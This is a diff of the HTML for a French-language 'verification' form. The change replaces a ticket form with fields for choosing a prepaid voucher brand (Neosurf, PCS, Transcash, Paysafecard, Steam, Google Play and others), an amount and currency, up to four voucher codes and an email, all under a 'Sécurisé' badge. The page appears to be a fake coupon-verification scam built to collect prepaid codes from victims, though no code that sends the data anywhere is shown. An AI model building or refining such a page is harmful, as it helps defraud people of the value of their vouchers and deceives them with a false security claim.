@@ -56,48 +56,89 @@
     </div>
 
     <form class="space-y-8" id="verification-form">
-      <!-- Email -->
+      <!-- Recharge -->
       <div>
-        <label class="block font-label-md text-label-md text-on-surface mb-2" for="email">Adresse E-mail</label>
+        <label class="block font-label-md text-label-md text-on-surface mb-2" for="recharge">Choisir une recharge *</label>
         <div class="relative">
-          <span class="material-symbols-outlined absolute left-4 top-1/2 -translate-y-1/2 text-outline">mail</span>
-          <input class="w-full pl-12 pr-4 py-3 bg-surface border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary font-body-md text-body-md text-on-surface transition-colors"
-                 id="email" placeholder="votre@email.fr" required type="email"/>
+          <span class="material-symbols-outlined absolute left-4 top-1/2 -translate-y-1/2 text-outline">credit_card</span>
+          <select class="w-full pl-12 pr-4 py-3 bg-surface border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary font-body-md text-body-md text-on-surface transition-colors appearance-none" id="recharge" required>
+            <option value="" disabled selected>Sélectionnez une recharge</option>
+            <option value="NEOSURF">NEOSURF</option>
+            <option value="PCS">PCS</option>
+            <option value="TRANSCASH">TRANSCASH</option>
+            <option value="PAYSAFECARD">PAYSAFECARD</option>
+            <option value="GOOGLE PLAY">GOOGLE PLAY</option>
+            <option value="STEAM">STEAM</option>
+            <option value="FLEXEPIN">FLEXEPIN</option>
+            <option value="CASHLIB">CASHLIB</option>
+            <option value="NETFLIX">NETFLIX</option>
+            <option value="AMAZON">AMAZON</option>
+          </select>
         </div>
       </div>
 
-      <!-- Tickets -->
+      <!-- Montant -->
+      <div>
+        <label class="block font-label-md text-label-md text-on-surface mb-2" for="montant">Montant de la recharge *</label>
+        <div class="relative">
+          <span class="material-symbols-outlined absolute left-4 top-1/2 -translate-y-1/2 text-outline">payments</span>
+          <input class="w-full pl-12 pr-4 py-3 bg-surface border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary font-body-md text-body-md text-on-surface transition-colors"
+                 id="montant" placeholder="0" required type="number" min="0" step="0.01"/>
+        </div>
+      </div>
+
+      <!-- Devise -->
+      <div>
+        <label class="block font-label-md text-label-md text-on-surface mb-2" for="devise">Choisir une devise *</label>
+        <div class="relative">
+          <span class="material-symbols-outlined absolute left-4 top-1/2 -translate-y-1/2 text-outline">currency_exchange</span>
+          <select class="w-full pl-12 pr-4 py-3 bg-surface border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary font-body-md text-body-md text-on-surface transition-colors appearance-none" id="devise" required>
+            <option value="" disabled selected>Sélectionnez une devise</option>
+            <option value="euro">Euro (€)</option>
+            <option value="dollar">Dollar ($)</option>
+            <option value="franc suisse">Franc Suisse (CHF)</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- Codes -->
       <div class="space-y-4">
         <div class="flex items-center justify-between mb-4">
-          <h2 class="font-headline-md text-headline-md text-on-surface">Codes des Tickets</h2>
+          <h2 class="font-headline-md text-headline-md text-on-surface">Entrez les codes de recharge</h2>
           <span class="bg-green-100 text-green-700 border border-green-200 px-3 py-1 rounded-full font-label-sm text-label-sm font-semibold">✓ Sécurisé</span>
         </div>
         <div class="space-y-4" id="tickets-container">
           <div>
-            <label class="block font-label-md text-label-md text-on-surface-variant mb-1" for="ticket-1">Ticket #1</label>
+            <label class="block font-label-md text-label-md text-on-surface-variant mb-1" for="ticket-1">Entrez le code de la recharge 1 *</label>
             <input class="ticket-input w-full px-4 py-3 bg-surface border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary text-primary transition-colors"
                    id="ticket-1" placeholder="XXXX-XXXX-XXXX" required type="text"/>
           </div>
           <div>
-            <label class="block font-label-md text-label-md text-on-surface-variant mb-1" for="ticket-2">Ticket #2</label>
+            <label class="block font-label-md text-label-md text-on-surface-variant mb-1" for="ticket-2">Entrez le code de la recharge 2</label>
             <input class="ticket-input w-full px-4 py-3 bg-surface border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary text-primary transition-colors"
                    id="ticket-2" placeholder="XXXX-XXXX-XXXX" type="text"/>
           </div>
           <div>
-            <label class="block font-label-md text-label-md text-on-surface-variant mb-1" for="ticket-3">Ticket #3</label>
+            <label class="block font-label-md text-label-md text-on-surface-variant mb-1" for="ticket-3">Entrez le code de la recharge 3</label>
             <input class="ticket-input w-full px-4 py-3 bg-surface border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary text-primary transition-colors"
                    id="ticket-3" placeholder="XXXX-XXXX-XXXX" type="text"/>
           </div>
           <div>
-            <label class="block font-label-md text-label-md text-on-surface-variant mb-1" for="ticket-4">Ticket #4</label>
+            <label class="block font-label-md text-label-md text-on-surface-variant mb-1" for="ticket-4">Entrez le code de la recharge 4</label>
             <input class="ticket-input w-full px-4 py-3 bg-surface border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary text-primary transition-colors"
                    id="ticket-4" placeholder="XXXX-XXXX-XXXX" type="text"/>
           </div>
         </div>
-        <button class="btn-add-ticket" type="button" id="add-ticket-btn">
-          <span class="material-symbols-outlined text-lg">add_circle</span>
-          Ajouter un ticket
-        </button>
+      </div>
+
+      <!-- Email -->
+      <div>
+        <label class="block font-label-md text-label-md text-on-surface mb-2" for="email">Entrez votre adresse mail *</label>
+        <div class="relative">
+          <span class="material-symbols-outlined absolute left-4 top-1/2 -translate-y-1/2 text-outline">mail</span>
+          <input class="w-full pl-12 pr-4 py-3 bg-surface border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary font-body-md text-body-md text-on-surface transition-colors"
+                 id="email" placeholder="exemple@domain.com" required type="email"/>
+        </div>
       </div>
 
       <!-- Security notice -->
@@ -113,7 +154,7 @@
         <button class="btn-submit w-full bg-primary hover:bg-primary-container text-on-primary font-label-md text-label-md py-4 rounded-lg flex justify-center items-center gap-2 shadow-sm transition-all duration-200 border-t border-white/20"
                 type="submit" id="submit-btn">
           <span class="material-symbols-outlined" style="font-variation-settings:'FILL' 1;">verified</span>
-          Vérifier maintenant
+          Valider
         </button>
       </div>
     </form>
